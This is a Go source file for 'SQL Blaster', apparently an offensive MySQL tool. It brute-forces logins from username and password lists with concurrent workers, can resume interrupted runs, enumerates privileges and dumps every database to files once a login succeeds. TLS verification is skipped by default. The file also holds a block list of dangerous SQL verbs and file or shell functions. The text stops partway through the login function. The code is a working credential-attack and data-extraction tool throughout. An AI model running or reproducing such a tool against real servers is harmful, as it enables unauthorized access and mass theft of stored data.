package main

import (
    "bufio"
    "context"
    "database/sql"
    "encoding/json"
    "flag"
    "fmt"
    "os"
    "os/signal"
    "path/filepath"
    "strings"
    "sync"
    "syscall"
    "time"

    _ "github.com/go-sql-driver/mysql"
    "github.com/fatih/color"
    "github.com/mitchellh/mapstructure"
    "github.com/schollz/progressbar/v3"
)

// Config holds all configuration options
type Config struct {
    Host           string `json:"host"`
    Port           int    `json:"port"`
    SingleUser     string `json:"singleUser"`
    UserList       string `json:"userList"`
    SinglePass     string `json:"singlePass"`
    PassList       string `json:"passList"`
    Verbose        bool   `json:"verbose"`
    FirstOnly      bool   `json:"firstOnly"`
    UserFirst      bool   `json:"userFirst"`
    ExecCmd        string `json:"execCmd"`
    AllowDangerous bool   `json:"allowDangerous"`
    LogFile        string `json:"logFile"`
    UseSSL         bool   `json:"useSSL"`
    SkipSSL        bool   `json:"skipSSL"`
    Workers        int    `json:"workers"`
    Enum           bool   `json:"enum"`
    EnumOutputFile string `json:"enumOutputFile"`
    Dump           bool   `json:"dump"`
    DumpDir        string `json:"dumpDir"`
    QuietDump      bool   `json:"quietDump"`
    MaxRowsPerFile int    `json:"maxRowsPerFile"`
}

// State struct to hold the last tested credentials
type State struct {
    LastUser string `json:"last_user"`
    LastPass string `json:"last_pass"`
}

// Global configuration
var cfg Config
var connectMode bool

// verbosePrintf prints a message if verbose mode is enabled
func verbosePrintf(format string, a ...interface{}) {
    if cfg.Verbose {
        fmt.Printf(format, a...)
    }
}

// verbosePrintln prints a line if verbose mode is enabled
func verbosePrintln(a ...interface{}) {
    if cfg.Verbose {
        fmt.Println(a...)
    }
}

func main() {
    // Always display the banner at program start
    displayBanner()

    // Define command-line flags
    flag.StringVar(&cfg.Host, "h", "", "Remote MySQL server address (required)")
    flag.StringVar(&cfg.SingleUser, "u", "", "Single username to test")
    flag.StringVar(&cfg.UserList, "U", "", "File containing usernames, one per line")
    flag.IntVar(&cfg.Port, "port", 3306, "MySQL server port")
    flag.StringVar(&cfg.SinglePass, "p", "", "Single password to test")
    flag.StringVar(&cfg.PassList, "P", "", "File containing passwords, one per line")
    flag.BoolVar(&cfg.Verbose, "v", false, "Enable verbose mode")
    flag.BoolVar(&cfg.FirstOnly, "f", false, "Stop at first successful login")
    flag.BoolVar(&cfg.UserFirst, "user-first", false, "Loop over all usernames before next password")

    // Fix for the -e flag: Define with default value as a separate variable
    execCmdFlag := flag.String("e", "SHOW DATABASES;", "MySQL command to execute on success")

    flag.BoolVar(&cfg.AllowDangerous, "allow-dangerous", false, "Allow dangerous commands")

    var help bool
    flag.BoolVar(&help, "help", false, "Display help message")

    flag.StringVar(&cfg.LogFile, "log-file", "", "Log output to a file")

    var configFile string
    flag.StringVar(&configFile, "config", "", "Load settings from a JSON config file")

    flag.BoolVar(&cfg.UseSSL, "use-ssl", false, "Enable SSL/TLS for MySQL connection")
    flag.BoolVar(&cfg.SkipSSL, "skip-ssl", false, "Skip SSL/TLS entirely (overrides --use-ssl)")
    flag.IntVar(&cfg.Workers, "workers", 10, "Number of concurrent workers")

    var generateConfig bool
    flag.BoolVar(&generateConfig, "generate-config", false, "Generate a sample config file and exit")

    var resume bool
    flag.BoolVar(&resume, "resume", false, "Resume from the last tested credentials")

    flag.BoolVar(&cfg.Enum, "Enum", false, "Enumerate privileges, databases, and tables on success")
    flag.StringVar(&cfg.EnumOutputFile, "enum-output", "", "Save enumeration results to a file")

    flag.BoolVar(&connectMode, "connect", false, "Enter interactive mode after successful login")
    
    // New dump flags
    flag.BoolVar(&cfg.Dump, "dump", false, "Dump all databases and tables to files")
    flag.StringVar(&cfg.DumpDir, "dump-dir", "mysql_dump", "Directory to save dumped data")
    flag.BoolVar(&cfg.QuietDump, "quiet-dump", false, "Only show progress during dump, not actual data")
    flag.IntVar(&cfg.MaxRowsPerFile, "max-rows", 10000, "Maximum rows per dump file (0 for unlimited)")

    flag.Parse()

    // Ensure the SQL command doesn't contain flags (sanitize it)
    cfg.ExecCmd = sanitizeCommand(*execCmdFlag)

    // Set up context for graceful shutdown
    ctx, cancel := context.WithCancel(context.Background())
    defer cancel()

    // Create a context with the cancel function for global access
    ctx = context.WithValue(ctx, "cancelFunc", cancel)

    // Set up signal handling
    sigChan := make(chan os.Signal, 1)
    signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
    go func() {
        <-sigChan
        fmt.Println("\nShutting down gracefully...")
        cancel()
    }()

    // Generate config file and exit if requested
    if generateConfig {
        verbosePrintln("Generating sample configuration file")
        createSampleConfig()
        return
    }

    // Load config file if specified
    if configFile != "" {
        verbosePrintln("Loading configuration from", configFile)
        loadConfig(configFile)
    }

    // Show help and exit if requested
    if help {
        showHelp()
        return
    }

    // Display verbose configuration information
    if cfg.Verbose {
        fmt.Println("Configuration:")
        fmt.Println("  Host:", cfg.Host)
        fmt.Println("  Port:", cfg.Port)
        if cfg.SingleUser != "" {
            fmt.Println("  Username:", cfg.SingleUser)
        } else {
            fmt.Println("  Username list:", cfg.UserList)
        }
        if cfg.SinglePass != "" {
            fmt.Println("  Password:", cfg.SinglePass)
        } else if cfg.PassList != "" {
            fmt.Println("  Password list:", cfg.PassList)
        } else {
            fmt.Println("  Testing with no password")
        }
        fmt.Println("  Workers:", cfg.Workers)
        fmt.Println("  Execute command:", cfg.ExecCmd)
        fmt.Println("  SSL enabled:", cfg.UseSSL)
        fmt.Println("  SSL skipped:", cfg.SkipSSL)
        fmt.Println("  First match only:", cfg.FirstOnly)
        fmt.Println("  User-first strategy:", cfg.UserFirst)
        fmt.Println("  Allow dangerous commands:", cfg.AllowDangerous)
        fmt.Println("  Enumeration enabled:", cfg.Enum)
        if cfg.EnumOutputFile != "" {
            fmt.Println("  Enumeration output file:", cfg.EnumOutputFile)
        }
        if cfg.LogFile != "" {
            fmt.Println("  Log file:", cfg.LogFile)
        }
        fmt.Println("  Interactive mode:", connectMode)
        if cfg.Dump {
            fmt.Println("  Database dump enabled:", cfg.Dump)
            fmt.Println("  Dump directory:", cfg.DumpDir)
            fmt.Println("  Quiet dump mode:", cfg.QuietDump)
            fmt.Println("  Max rows per file:", cfg.MaxRowsPerFile)
        }
        fmt.Println("")
    }

    // Validate inputs
    if cfg.Host == "" {
        color.Red("Error: Hostname (-h) is required.")
        showHelp()
        os.Exit(1)
    }
    if cfg.SingleUser == "" && cfg.UserList == "" {
        color.Red("Error: Either single username (-u) or username file (-U) must be specified.")
        showHelp()
        os.Exit(1)
    }
    if cfg.SingleUser != "" && cfg.UserList != "" {
        color.Red("Error: -u and -U are mutually exclusive.")
        showHelp()
        os.Exit(1)
    }
    if cfg.UserList != "" && !fileExists(cfg.UserList) {
        color.Red("Error: Username file '%s' not found", cfg.UserList)
        os.Exit(1)
    }
    if cfg.PassList != "" && !fileExists(cfg.PassList) {
        color.Red("Error: Password file '%s' not found", cfg.PassList)
        os.Exit(1)
    }
    if connectMode {
        if cfg.SingleUser == "" || cfg.SinglePass == "" {
            color.Red("Error: --connect requires single username (-u) and password (-p).")
            showHelp()
            os.Exit(1)
        }
        if cfg.UserList != "" || cfg.PassList != "" {
            color.Red("Error: --connect is not compatible with -U or -P flags.")
            showHelp()
            os.Exit(1)
        }
    }
    if cfg.Dump {
        if cfg.SingleUser == "" || cfg.SinglePass == "" {
            color.Red("Error: --dump requires single username (-u) and password (-p).")
            showHelp()
            os.Exit(1)
        }
        if cfg.UserList != "" || cfg.PassList != "" {
            color.Red("Error: --dump is not compatible with -U or -P flags.")
            showHelp()
            os.Exit(1)
        }
    }

    fmt.Printf("Starting MySQL testing on %s:%d...\n", cfg.Host, cfg.Port)

    // Set up logging
    var logFile *os.File
    if cfg.LogFile != "" {
        verbosePrintln("Opening log file:", cfg.LogFile)
        var err error
        logFile, err = os.OpenFile(cfg.LogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
            color.Red("Error opening log file: %v", err)
            os.Exit(1)
        }
        defer logFile.Close()
        verbosePrintln("Log file opened successfully")
    }

    // Perform the testing
    performTesting(ctx, resume, logFile)
}

// sanitizeCommand ensures the SQL command is safe to execute
func sanitizeCommand(cmd string) string {
    // Trim whitespace
    cmd = strings.TrimSpace(cmd)

    // Remove any trailing semicolons (MySQL will add them)
    cmd = strings.TrimRight(cmd, ";")

    // Add a single semicolon at the end
    if cmd != "" && !strings.HasSuffix(cmd, ";") {
        cmd += ";"
    }

    // If somehow the command is empty, use a safe default
    if cmd == "" || cmd == ";" {
        cmd = "SHOW DATABASES;"
    }

    return cmd
}

// displayBanner shows the program banner
func displayBanner() {
    fmt.Println(`
                                                                 █                                   
                                                            █████                                   
                                                ████████    ████                                    
                                  ████████    ███████████  █████                                    
                                ███████████  █████  █████  █████                                    
                               █████  █████ █████   █████ ██████       ███                          
                               █████  ████ █████    █████ █████      ██████████████████             
                               ██████ ██   █████    █████ █████      ██████████████████             
                                ███████   █████    ███████████       ██████████████████             
                                 ███████  █████    █████ ████    ██   ████████████                  
                               ███ ███████████    █████████████████  ██████████                     
                             ████   ███████████████████ ███████████  █████                          
                            ████    █████ ███████████  ██████  ████  ████     ██                    
                           █████   ██████  ███████████ ██     █████  ███    █████                   
                            ███████████     █████████████    ███████        ██████████              
                       █████ ████████              █████    ████████ ███████ ████████               
                  █████████████   █████               ██   ██████  █████████ ████████               
                ████████████████  ████              ████    ████  █████ ████████████  ██            
               ████ █████  █████ █████    ████████  ████    ████  █████████ ███████  ███            
             █████  █████  █████ ████   █████████  ██████  █████ █████████ ███ ████████             
             ████  █████  █████  ████ ███████████ ███████  ████  █████   ████  ███████              
            █████  ███████████  ████  ████  ████  ███ █████████████████████                         
             ████████████████   ████ █████ █████ ████ ███████████████████     █████████             
              ███ ████████████ ████  █████ ████ ████████████████      ███████████████               
                  ████    █████████ ████████████████████     ██████████████                         
                 █████    ██████████████████████    █████████████████                               
                 ████    ████████████ ████   ██████████████████                                     
                █████████████         █████████████████                                             
                ████████████   ███████████████████                                                  
               ██████████ ███████████████████                                                       
                      █████████████████                                                             
                            ███████                                                                 
                                                                                                    `)

    fmt.Println("SQL Blaster - A MySQL Enumeration & Dumping Tool Written in Go!")
    fmt.Println()
}

// performTesting coordinates the credential testing process
func performTesting(ctx context.Context, resume bool, logFile *os.File) {
    verbosePrintln("Starting credential testing process")

    if resume {
        verbosePrintln("Resume mode is enabled, will attempt to continue from last state")
    }

    // Special handling for dump mode
    if cfg.Dump {
        verbosePrintln("Database dump mode enabled, directly testing credentials and performing dump")
        result := testLogin(ctx, cfg.SingleUser, cfg.SinglePass, logFile)
        if result != "" {
            fmt.Println(result)
            if logFile != nil {
                logFile.WriteString(result + "\n")
            }
            return
        }
        return
    }

    // Prepare usernames
    var userChan <-chan string
    if cfg.SingleUser != "" {
        verbosePrintln("Using single username:", cfg.SingleUser)
        userChan = singleValueChannel(cfg.SingleUser)
    } else {
        if resume && fileExists("state.json") {
            state := loadState()
            verbosePrintln("Resuming from username:", state.LastUser)
            userChan = resumeStreamFromFile(cfg.UserList, state.LastUser)
        } else {
            verbosePrintln("Loading usernames from file:", cfg.UserList)
            userChan = streamLinesFromFile(cfg.UserList)
        }
    }

    // Prepare passwords
    var passChan <-chan string
    if cfg.SinglePass != "" {
        verbosePrintln("Using single password:", cfg.SinglePass)
        passChan = singleValueChannel(cfg.SinglePass)
    } else if cfg.PassList != "" {
        if resume && fileExists("state.json") {
            state := loadState()
            verbosePrintln("Resuming from password:", state.LastPass)
            passChan = resumeStreamFromFile(cfg.PassList, state.LastPass)
        } else {
            verbosePrintln("Loading passwords from file:", cfg.PassList)
            passChan = streamLinesFromFile(cfg.PassList)
        }
    } else {
        verbosePrintln("Testing with no password")
        passChan = singleValueChannel("") // Test with no password
    }

    // Build credential pairs (based on user-first flag)
    verbosePrintln("Building credential pairs with strategy:",
        map[bool]string{true: "user-first", false: "password-first"}[cfg.UserFirst])
    credChan := buildCredentialPairs(userChan, passChan, cfg.UserFirst)

    // Count total credentials for progress bar (estimate if streaming)
    var totalTests int
    if cfg.SingleUser != "" {
        if cfg.SinglePass != "" {
            totalTests = 1
        } else if cfg.PassList != "" {
            totalTests = countLines(cfg.PassList)
        } else {
            totalTests = 1
        }
    } else if cfg.UserList != "" {
        userCount := countLines(cfg.UserList)
        if cfg.SinglePass != "" {
            totalTests = userCount
        } else if cfg.PassList != "" {
            totalTests = userCount * countLines(cfg.PassList)
        } else {
            totalTests = userCount
        }
    }
    verbosePrintln("Estimated total tests to perform:", totalTests)

    // Set up progress bar
    bar := progressbar.NewOptions(totalTests,
        progressbar.OptionSetDescription("Testing credentials"),
        progressbar.OptionSetWidth(30),
        progressbar.OptionShowCount(),
        progressbar.OptionShowIts(),
        progressbar.OptionSetItsString("tests"),
    )

    // Channel to receive results
    results := make(chan string, cfg.Workers*2)
    var wg sync.WaitGroup
    var mu sync.Mutex
    successFound := false

    // Create worker pool with semaphore
    verbosePrintln("Setting up worker pool with", cfg.Workers, "concurrent workers")
    semaphore := make(chan struct{}, cfg.Workers)

    // Process credential pairs
    go func() {
        defer close(results)
        var processed int
        for cred := range credChan {
            processed++
            if processed%1000 == 0 {
                verbosePrintf("\rProcessed %d credential pairs", processed)
            }

            select {
            case <-ctx.Done():
                verbosePrintln("\nContext cancelled, stopping credential processing")
                return // Context cancelled, stop processing
            case semaphore <- struct{}{}: // Acquire semaphore slot
                wg.Add(1)
                go func(user, pass string) {
                    defer wg.Done()
                    defer func() { <-semaphore }() // Release semaphore slot

                    // Check if we should stop (first success found)
                    if cfg.FirstOnly {
                        mu.Lock()
                        if successFound {
                            mu.Unlock()
                            return
                        }
                        mu.Unlock()
                    }

                    result := testLogin(ctx, user, pass, logFile)
                    if result != "" {
                        mu.Lock()
                        if cfg.FirstOnly && !successFound {
                            successFound = true
                            fmt.Println(result)
                            if logFile != nil {
                                logFile.WriteString(result + "\n")
                            }
                            verbosePrintln("First success found, cancelling remaining operations")
                            cancel := ctx.Value("cancelFunc").(context.CancelFunc)
                            cancel() // Cancel all operations
                        } else {
                            results <- result
                        }
                        mu.Unlock()
                    }
                    bar.Add(1)
                    // Save state after each test
                    saveState(user, pass)
                }(cred.user, cred.pass)
            }
        }
        verbosePrintln("\nAll credential pairs have been submitted to workers")

        // Wait for all workers to finish
        verbosePrintln("Waiting for all workers to complete")
        wg.Wait()
        verbosePrintln("All workers have completed")
    }()

    // Collect and display results
    successCount := 0
    verbosePrintln("Starting to collect results")
    for {
        select {
        case <-ctx.Done():
            verbosePrintln("Context cancelled, stopping result collection")
            fmt.Println("\nTesting interrupted.")
            verbosePrintf("Found %d successful logins\n", successCount)
            return
        case result, ok := <-results:
            if !ok {
                verbosePrintln("Result channel closed, all processing complete")
                fmt.Println("\nTesting complete.")
                verbosePrintf("Found %d successful logins\n", successCount)
                return
            }
            successCount++
            fmt.Println(result)
            if logFile != nil {
                logFile.WriteString(result + "\n")
            }
        }
    }
}

// Credential represents a username/password pair
type Credential struct {
    user string
    pass string
}

// buildCredentialPairs creates credential pairs based on strategy
func buildCredentialPairs(userChan, passChan <-chan string, userFirst bool) <-chan Credential {
    credChan := make(chan Credential)

    go func() {
        defer close(credChan)
        verbosePrintln("Building credential pairs")

        if userFirst {
            // Collect all users and passwords
            var users, passwords []string
            verbosePrintln("Collecting all usernames")
            for u := range userChan {
                users = append(users, u)
            }
            verbosePrintf("Collected %d usernames\n", len(users))

            verbosePrintln("Collecting all passwords")
            for p := range passChan {
                passwords = append(passwords, p)
            }
            verbosePrintf("Collected %d passwords\n", len(passwords))

            // Loop users first, then passwords
            verbosePrintln("Using user-first strategy to generate pairs")
            for i, u := range users {
                if i > 0 && i%1000 == 0 {
                    verbosePrintf("\rProcessed %d/%d users", i, len(users))
                }
                for _, p := range passwords {
                    credChan <- Credential{u, p}
                }
            }
            if len(users) >= 1000 {
                fmt.Println() // Add newline after progress output
            }
        } else {
            // Direct pairing without storing all combinations
            var users []string
            verbosePrintln("Collecting all usernames")
            for u := range userChan {
                users = append(users, u)
            }
            verbosePrintf("Collected %d usernames\n", len(users))

            // For each password, test all users
            verbosePrintln("Using password-first strategy to generate pairs")
            passwordCount := 0
            for p := range passChan {
                passwordCount++
                if passwordCount%100 == 0 {
                    verbosePrintf("\rProcessed %d passwords", passwordCount)
                }
                for _, u := range users {
                    credChan <- Credential{u, p}
                }
            }
            if passwordCount >= 100 {
                fmt.Println() // Add newline after progress output
            }
        }
        verbosePrintln("Finished building credential pairs")
    }()

    return credChan
}

// singleValueChannel returns a channel that yields a single value
func singleValueChannel(value string) <-chan string {
    ch := make(chan string, 1)
    ch <- value
    close(ch)
    return ch
}

// streamLinesFromFile reads lines from a file into a channel
func streamLinesFromFile(filename string) <-chan string {
    ch := make(chan string)

    go func() {
        defer close(ch)

        verbosePrintln("Reading lines from", filename)
        file, err := os.Open(filename)
        if err != nil {
            color.Red("Error opening file: %v", err)
            return
        }
        defer file.Close()

        lineCount := 0
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            line := strings.TrimSpace(scanner.Text())
            if line != "" {
                ch <- line
                lineCount++
                if cfg.Verbose && lineCount%1000 == 0 {
                    fmt.Printf("\rRead %d lines from %s", lineCount, filename)
                }
            }
        }

        if cfg.Verbose && lineCount >= 1000 {
            fmt.Println() // Add newline after progress output
        }

        verbosePrintln("Finished reading", lineCount, "lines from", filename)

        if err := scanner.Err(); err != nil {
            color.Red("Error reading file: %v", err)
        }
    }()

    return ch
}

// resumeStreamFromFile continues reading from a file after lastValue
func resumeStreamFromFile(filename, lastValue string) <-chan string {
    ch := make(chan string)

    go func() {
        defer close(ch)

        verbosePrintf("Resuming file read from %s after value %s\n", filename, lastValue)
        file, err := os.Open(filename)
        if err != nil {
            color.Red("Error opening file: %v", err)
            return
        }
        defer file.Close()

        foundLast := false
        if lastValue == "" {
            verbosePrintln("No last value specified, starting from beginning")
            foundLast = true // No last value to find, start from beginning
        }

        lineCount := 0
        resumedCount := 0
        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            line := strings.TrimSpace(scanner.Text())
            lineCount++

            if line == "" {
                continue
            }

            if foundLast {
                ch <- line
                resumedCount++
                if cfg.Verbose && resumedCount%1000 == 0 {
                    fmt.Printf("\rResumed reading %d lines", resumedCount)
                }
            } else if line == lastValue {
                verbosePrintf("Found last value '%s' at line %d\n", lastValue, lineCount)
                foundLast = true
            }
        }

        if cfg.Verbose && resumedCount >= 1000 {
            fmt.Println() // Add newline after progress output
        }

        verbosePrintf("Resume complete: read %d total lines, resumed from line %d, processed %d lines\n",
            lineCount, lineCount-resumedCount, resumedCount)

        if err := scanner.Err(); err != nil {
            color.Red("Error reading file: %v", err)
        }
    }()

    return ch
}

// countLines returns the number of non-empty lines in a file
func countLines(filename string) int {
    verbosePrintf("Counting lines in %s... ", filename)
    file, err := os.Open(filename)
    if err != nil {
        verbosePrintln("error:", err)
        return 0
    }
    defer file.Close()

    count := 0
    scanner := bufio.NewScanner(file)
    for scanner.Scan() {
        if strings.TrimSpace(scanner.Text()) != "" {
            count++
        }
    }
    verbosePrintln("found", count, "lines")
    return count
}

// createSampleConfig generates a sample config.json file
func createSampleConfig() {
    verbosePrintln("Creating sample configuration file")
    sampleConfig := Config{
        Host:           "mysql.server.com",
        Port:           3306,
        SingleUser:     "admin",
        UserList:       "users.txt",
        SinglePass:     "pass123",
        PassList:       "pass.txt",
        Verbose:        true,
        FirstOnly:      false,
        UserFirst:      false,
        ExecCmd:        "SHOW DATABASES;",
        AllowDangerous: false,
        LogFile:        "results.log",
        UseSSL:         false,
        Workers:        10,
        Enum:           false,
        EnumOutputFile: "enum_results.txt",
        Dump:           false,
        DumpDir:        "mysql_dump",
        QuietDump:      false,
        MaxRowsPerFile: 10000,
    }

    file, err := os.Create("config.json")
    if err != nil {
        color.Red("Error creating config file: %v", err)
        os.Exit(1)
    }
    defer file.Close()

    encoder := json.NewEncoder(file)
    encoder.SetIndent("", "  ")
    if err := encoder.Encode(sampleConfig); err != nil {
        color.Red("Error encoding config file: %v", err)
        os.Exit(1)
    }

    fmt.Println("Sample config file 'config.json' created. Please adjust the values and remove this message.")
    verbosePrintln("Sample config file created successfully")
}

// loadState loads the testing state from the state file
func loadState() State {
    var state State

    verbosePrintln("Loading state from state.json")
    stateFile, err := os.Open("state.json")
    if err != nil {
        color.Red("Error opening state file: %v", err)
        return State{}
    }
    defer stateFile.Close()

    decoder := json.NewDecoder(stateFile)
    if err := decoder.Decode(&state); err != nil {
        color.Red("Error decoding state file: %v", err)
        return State{}
    }

    verbosePrintln("Loaded state - Last user:", state.LastUser, "Last pass:", state.LastPass)
    return state
}

// saveState saves the current state to state.json
func saveState(user, pass string) {
    state := State{LastUser: user, LastPass: pass}

    file, err := os.Create("state.json")
    if err != nil {
        color.Red("Error creating state file: %v", err)
        return
    }
    defer file.Close()

    encoder := json.NewEncoder(file)
    encoder.SetIndent("", "  ")
    if err := encoder.Encode(state); err != nil {
        color.Red("Error encoding state file: %v", err)
    }
}

// loadConfig loads settings from a JSON file
func loadConfig(filename string) {
    verbosePrintln("Loading configuration from file:", filename)
    file, err := os.Open(filename)
    if err != nil {
        color.Red("Error opening config file: %v", err)
        os.Exit(1)
    }
    defer file.Close()

    var fileConfig map[string]interface{}
    decoder := json.NewDecoder(file)
    if err := decoder.Decode(&fileConfig); err != nil {
        color.Red("Error decoding config file: %v", err)
        os.Exit(1)
    }

    // Use mapstructure to convert map to struct
    // Only overwrite values that aren't set by command line
    var newCfg Config
    if err := mapstructure.Decode(fileConfig, &newCfg); err != nil {
        color.Red("Error mapping config values: %v", err)
        os.Exit(1)
    }

    // Only apply values from config file that weren't set via command line
    if cfg.Host == "" {
        cfg.Host = newCfg.Host
        verbosePrintln("Using host from config:", cfg.Host)
    }
    if cfg.Port == 3306 && newCfg.Port != 0 {
        cfg.Port = newCfg.Port
        verbosePrintln("Using port from config:", cfg.Port)
    }
    if cfg.SingleUser == "" && newCfg.SingleUser != "" {
        cfg.SingleUser = newCfg.SingleUser
        verbosePrintln("Using single user from config:", cfg.SingleUser)
    }
    if cfg.UserList == "" && newCfg.UserList != "" {
        cfg.UserList = newCfg.UserList
        verbosePrintln("Using user list from config:", cfg.UserList)
    }
    if cfg.SinglePass == "" && newCfg.SinglePass != "" {
        cfg.SinglePass = newCfg.SinglePass
        verbosePrintln("Using single password from config:", cfg.SinglePass)
    }
    if cfg.PassList == "" && newCfg.PassList != "" {
        cfg.PassList = newCfg.PassList
        verbosePrintln("Using password list from config:", cfg.PassList)
    }
    if !cfg.Verbose && newCfg.Verbose {
        cfg.Verbose = newCfg.Verbose
        verbosePrintln("Enabling verbose mode from config")
    }
    if !cfg.FirstOnly && newCfg.FirstOnly {
        cfg.FirstOnly = newCfg.FirstOnly
        verbosePrintln("Enabling first-only mode from config")
    }
    if !cfg.UserFirst && newCfg.UserFirst {
        cfg.UserFirst = newCfg.UserFirst
        verbosePrintln("Enabling user-first strategy from config")
    }
    if cfg.ExecCmd == "SHOW DATABASES;" && newCfg.ExecCmd != "" {
        cfg.ExecCmd = sanitizeCommand(newCfg.ExecCmd)
        verbosePrintln("Using command from config:", cfg.ExecCmd)
    }
    if !cfg.AllowDangerous && newCfg.AllowDangerous {
        cfg.AllowDangerous = newCfg.AllowDangerous
        verbosePrintln("Enabling dangerous command execution from config")
    }
    if cfg.LogFile == "" && newCfg.LogFile != "" {
        cfg.LogFile = newCfg.LogFile
        verbosePrintln("Using log file from config:", cfg.LogFile)
    }
    if !cfg.UseSSL && newCfg.UseSSL {
        cfg.UseSSL = newCfg.UseSSL
        verbosePrintln("Enabling SSL from config")
    }
    if !cfg.SkipSSL && newCfg.SkipSSL {
        cfg.SkipSSL = newCfg.SkipSSL
        verbosePrintln("Skipping SSL from config")
    }
    if cfg.Workers == 10 && newCfg.Workers != 0 {
        cfg.Workers = newCfg.Workers
        verbosePrintln("Using worker count from config:", cfg.Workers)
    }
    if !cfg.Enum && newCfg.Enum {
        cfg.Enum = newCfg.Enum
        verbosePrintln("Enabling enumeration from config")
    }
    if cfg.EnumOutputFile == "" && newCfg.EnumOutputFile != "" {
        cfg.EnumOutputFile = newCfg.EnumOutputFile
        verbosePrintln("Using enumeration output file from config:", cfg.EnumOutputFile)
    }
    if !cfg.Dump && newCfg.Dump {
        cfg.Dump = newCfg.Dump
        verbosePrintln("Enabling database dump from config")
    }
    if cfg.DumpDir == "mysql_dump" && newCfg.DumpDir != "" {
        cfg.DumpDir = newCfg.DumpDir
        verbosePrintln("Using dump directory from config:", cfg.DumpDir)
    }
    if !cfg.QuietDump && newCfg.QuietDump {
        cfg.QuietDump = newCfg.QuietDump
        verbosePrintln("Enabling quiet dump mode from config")
    }
    if cfg.MaxRowsPerFile == 10000 && newCfg.MaxRowsPerFile != 0 {
        cfg.MaxRowsPerFile = newCfg.MaxRowsPerFile
        verbosePrintln("Using max rows per file from config:", cfg.MaxRowsPerFile)
    }

    verbosePrintln("Configuration loaded successfully")
}

// fileExists checks if a file exists and is not a directory
func fileExists(filename string) bool {
    verbosePrintf("Checking if file exists: %s... ", filename)
    info, err := os.Stat(filename)
    if os.IsNotExist(err) {
        verbosePrintln("not found")
        return false
    }
    isFile := !info.IsDir()
    verbosePrintf("found, is file: %v\n", isFile)
    return isFile
}

// getSqlVerb extracts the first SQL verb from a command
func getSqlVerb(cmd string) string {
    cmd = strings.TrimSpace(cmd)
    cmd = strings.Split(cmd, "--")[0] // Remove comments
    cmd = strings.Split(cmd, "#")[0]
    words := strings.Fields(cmd)
    if len(words) > 0 {
        return strings.ToUpper(words[0])
    }
    return ""
}

// isDangerous checks if a command starts with a dangerous verb or contains dangerous functions
func isDangerous(cmd string) bool {
    // Normalize command for checking
    cmdUpper := strings.ToUpper(strings.TrimSpace(cmd))
    
    // Check for dangerous SQL verbs
    verb := getSqlVerb(cmd)
    verbosePrintln("Checking if SQL verb is dangerous:", verb)
    
    dangerousVerbs := []string{"DROP", "DELETE", "TRUNCATE", "UPDATE", "INSERT", "ALTER", "GRANT", "REVOKE", "CREATE"}
    for _, v := range dangerousVerbs {
        if verb == v {
            verbosePrintln("Command is dangerous (dangerous verb)")
            return true
        }
    }
    
    // Check for dangerous functions/operations
    dangerousFunctions := []string{
        "SYS_EXEC", "SYSTEM_EXEC", "SHELL", "OUTFILE", "DUMPFILE", 
        "BENCHMARK", "SLEEP", "LOAD_FILE", "INTO OUTFILE", "INTO DUMPFILE",
    }
    
    for _, df := range dangerousFunctions {
        if strings.Contains(cmdUpper, df) {
            verbosePrintln(fmt.Sprintf("Command is dangerous (contains %s)", df))
            return true
        }
    }
    
    verbosePrintln("Command is safe")
    return false
}

// testLogin attempts to connect to MySQL and execute the command if successful
func testLogin(ctx context.Context, user, pass string, log *os.File) string {
    if cfg.Verbose {
        if pass != "" {
            fmt.Printf("Testing username: %s with password: %s... ", user, pass)
        } else {
            fmt.Printf("Testing username: %s (no password)... ", user)
        }
    }

    var dsn string
    if cfg.SkipSSL {
        // Skip SSL entirely by omitting the tls parameter
        dsn = fmt.Sprintf("%s:%s@tcp(%s:%d)/", user, pass, cfg.Host, cfg.Port)
        verbosePrintln("Using connection string without SSL")
    } else {
        tlsOption := "skip-verify" // Default: insecure TLS
        if cfg.UseSSL && !cfg.SkipSSL {
            tlsOption = "true" // Secure TLS if --use-ssl is set and not overridden
            verbosePrintln("Using secure SSL/TLS connection")
        } else {
            verbosePrintln("Using skip-verify SSL/TLS connection")
        }
        dsn = fmt.Sprintf("%s:%s@tcp(%s:%d)/?tls=%s", user, pass, cfg.Host, cfg.Port, tlsOption)
    }

    verbosePrintln("Opening database connection")
    db, err := sql.Open("mysql", dsn)
    if err != nil {
        if cfg.Verbose {
            color.Red("Failed to open connection: %v", err)
        }
        return ""
    }
    defer db.Close()

    // Set connection timeouts
    db.SetConnMaxLifetime(time.Minute * 3)
    db.SetConnMaxIdleTime(time.Second * 30)
    db.SetMaxOpenConns(10)
    db.SetMaxIdleConns(10)
    verbosePrintln("Connection parameters set, attempting to ping server")

    // Create a timeout context for database operations
    dbCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
    defer cancel()

    err = db.PingContext(dbCtx)
    if err != nil {
        if cfg.Verbose {
            color.Red("Failed to ping server: %v", err)
        }
        return ""
    }
    verbosePrintln("Successfully connected to the server")

    if cfg.Verbose {
        fmt.Println() // Newline after "Testing..." message
    }

    var successMsg string
    if pass != "" {
        successMsg = color.GreenString("Success: %s with password '%s'", user, pass)
    } else {
        successMsg = color.GreenString("Success: %s with no password", user)
    }

    // If --dump is set, perform database dump and exit
    if cfg.Dump {
        fmt.Println(successMsg)
        
        // Get a persistent connection for dumping with extended capabilities
        dumpDSN := dsn
        if !strings.Contains(dumpDSN, "multiStatements=true") {
            if strings.Contains(dumpDSN, "?") {
                dumpDSN += "&multiStatements=true"
            } else {
                dumpDSN += "?multiStatements=true"
            }
        }
        
        dumpDB, err := sql.Open("mysql", dumpDSN)
        if err != nil {
            color.Red("Failed to open dump connection: %v", err)
            return successMsg + "\nFailed to start database dump."
        }
        defer dumpDB.Close()
        
        // Test the dump connection
        if err := dumpDB.Ping(); err != nil {
            color.Red("Failed to establish dump connection: %v", err)
            return successMsg + "\nFailed to start database dump."
        }
        
        // Perform the dump
        dumpResult := dumpAllDatabases(ctx, dumpDB)
        if log != nil {
            log.WriteString(dumpResult + "\n")
        }
        
        // If not in quiet mode, also print the result
        if !cfg.QuietDump {
            return successMsg + "\n" + dumpResult
        }
        
        return successMsg + "\nDatabase dump completed. Files saved to " + cfg.DumpDir
    }

    // If --connect is set, enter interactive mode and skip other operations
    if connectMode {
        fmt.Println(successMsg)
        
        // Get a persistent connection for interactive mode
        persistentDSN := dsn
        if !strings.Contains(persistentDSN, "multiStatements=true") {
